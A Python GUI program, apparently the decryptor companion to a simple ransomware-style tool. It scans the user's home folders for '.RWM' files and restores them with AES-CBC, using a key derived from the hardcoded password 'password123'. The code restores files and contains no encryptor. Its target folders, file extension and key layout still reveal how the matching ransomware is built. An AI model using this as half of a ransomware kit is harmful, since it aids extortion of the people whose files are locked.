import os
import sys
import tkinter
import tkinter.ttk
import threading
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad



password_key = "password123"

extension = ".RWM"

Folders = [
    "Documents",
    "Downloads",
    "Favorites",
    "Links",
    "Music",
    "Pictures",
    "Saved Games",
    "Videos",
    "OneDrive",
    "Desktop"
]

def decrypt_file(password, file_path):
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
    
    salt = encrypted_data[:16]
    iv = encrypted_data[16:32]
    ciphertext = encrypted_data[32:]
    
    key = PBKDF2(password, salt, dkLen=32, count=1000000)
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    with open(file_path, 'wb') as f:
        f.write(plaintext)
    
    if file_path.lower().endswith(extension.lower()):
        new_path = file_path.replace(extension, "")
        os.rename(file_path, new_path)
        return new_path
    return file_path



def startDecrypting(All_Decrypted_Files):
    user_folder = os.path.expanduser("~")
    # print(user_folder)

    for folders in Folders:
        full_folders_path = os.path.join(user_folder, folders)
           
        # print(full_folders_path)

        for root, dirs, files in os.walk(full_folders_path):
            for file in files:
                full_path = os.path.join(root, file)
                # print(full_path)

                # if not full_path.endswith(LocalFileName):
                    # print(full_path)

                if full_path.endswith(extension):
                    # print(full_path)

                    try:
                        output_path = decrypt_file(password_key.encode(), full_path)
                        # print(f"SUCCESS: File Decrypted: {output_path}")

                        current = int(All_Decrypted_Files.get())
                        All_Decrypted_Files.set(str(current + 1))
                        
                    except ValueError:
                        pass
                        # print(f"ERROR: Incorrect password or corrupted file: {full_path}")


def GetNumberOffFiles():
    number = 0

    user_folder = os.path.expanduser("~")

    for folders in Folders:
        full_folders_path = os.path.join(user_folder, folders)

        for root, dirs, files in os.walk(full_folders_path):
            for file in files:
                full_path = os.path.join(root, file)

                if full_path.endswith(extension):
                    number += 1

    return number


def GUI():
    root = tkinter.Tk()
    root.title("Decryptor")

    window_width = 350
    window_height = 110
    
    # Center window on screen
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width // 2) - (window_width // 2)
    y = (screen_height // 2) - (window_height // 2)
    root.geometry(f'{window_width}x{window_height}+{x}+{y}')

    # root.geometry("350x110")

    numbers_of_files = GetNumberOffFiles()

    All_Encrypted_Files = tkinter.StringVar()
    All_Encrypted_Files.set(str(numbers_of_files))

    All_Decrypted_Files = tkinter.StringVar()
    All_Decrypted_Files.set("0")

    l1 = tkinter.ttk.Label(root, text="All Encrypted Files")
    l1.place(x=10, y=10)

    l2 = tkinter.ttk.Label(root, text="All Decrypted Files")
    l2.place(x=10, y=40)

    e1 = tkinter.ttk.Entry(root, textvariable=All_Encrypted_Files)
    e1.place(x=130, y=8)

    e2 = tkinter.ttk.Entry(root, textvariable=All_Decrypted_Files)
    e2.place(x=130, y=38)

    b1 = tkinter.ttk.Button(root, text="Decrypt All Encrypted Files", command=lambda: threading.Thread(target=startDecrypting, args=(All_Decrypted_Files,), daemon=True).start())
    b1.place(x=100, y=75)

    root.mainloop()


if __name__ == "__main__":
    GUI()
